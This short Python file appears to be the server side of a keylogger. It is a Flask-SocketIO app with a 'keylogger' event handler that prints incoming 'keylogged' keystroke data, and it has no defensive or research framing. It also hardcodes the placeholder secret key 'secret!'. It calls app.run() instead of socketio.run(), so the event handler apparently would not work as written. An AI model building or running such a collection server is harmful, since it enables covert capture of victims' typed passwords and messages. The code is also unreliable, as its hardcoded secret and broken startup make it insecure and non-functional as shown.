from flask import Flask, render_template
from flask_socketio import SocketIO, emit
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

@socketio.on('keylogger')
def test_connect(data):
    print(data["keylogged"])


if __name__ == '__main__':
    app.run()